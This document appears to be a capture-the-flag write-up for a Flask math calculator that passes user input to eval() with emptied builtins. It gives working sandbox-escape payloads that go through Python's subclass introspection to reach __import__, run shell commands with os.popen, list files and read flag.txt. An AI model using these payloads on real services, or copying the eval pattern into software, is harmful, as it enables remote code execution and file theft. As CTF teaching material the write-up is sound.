@@ -1,0 +1,79 @@
+math Expression Calculator - RCE Exploit Writeup
+Challenge: Exploiting a vulnerable Flask-based math expression evaluator
+Category: Web Exploitation
+CTF: bEst Calculator
+Author: MahizhnanC
+
+Challenge Description :
+
+A web-based calculator built using Flask allows users to evaluate math expressions via a form. Our goal is to escape the restricted environment and retrieve the flag.
+
+Source Code Summary: 
+
+The backend uses eval() to process input, with limited __builtins__ and a few math functions:
+
+
+eval(
+    expression,
+    {
+        "__builtins__": {},
+        "sin": math.sin,
+        "cos": math.cos,
+        "tan": math.tan,
+        "log": math.log,
+        "sqrt": math.sqrt,
+        "pi": math.pi,
+        "e": math.e,
+    }
+
+The above looks secure at first, but eval() is inherently dangerous — especially in Python, where objects can be introspected deeply.
+
+Vulnerability:
+Python's object model allows access to restricted built-ins via a chain of attributes:
+
+python
+
+(1).__class__.__bases__[0].__subclasses__()
+This lets us access low-level classes, including file handlers and function definitions, allowing us to ultimately reintroduce __import__.
+
+Exploitation Steps:
+Step 1: Gain Access to __import__
+We navigated through Python internals to get the __import__ function:
+
+
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']
+Step 2: Execute OS Commands via os.popen
+
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']("os").popen("ls /").read()
+Examples:
+
+List files in /home/user:
+
+...__import__('os').popen('ls -la /home/user').read()
+
+Read source code files:
+
+...__import__('os').popen('cat /home/user/app.py').read()
+
+After exploring /home/user, I used ../ to navigate up and explore the full filesystem. This helped me locate the flag file outside the user directory.
+
+Example:
+
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('os').popen('ls -la /home/user/../..').read()
+This revealed the root directory, where I discovered flag.txt.
+
+Step 3: Capture the Flag
+Eventually, we located and read the flag:
+
+python
+
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['open']('../../flag.txt').read()
+
+flag:
+[REDACTED]
+
+
+
+Discord: Mahizh#1337
+CTF Team: [Your Team Name]
+
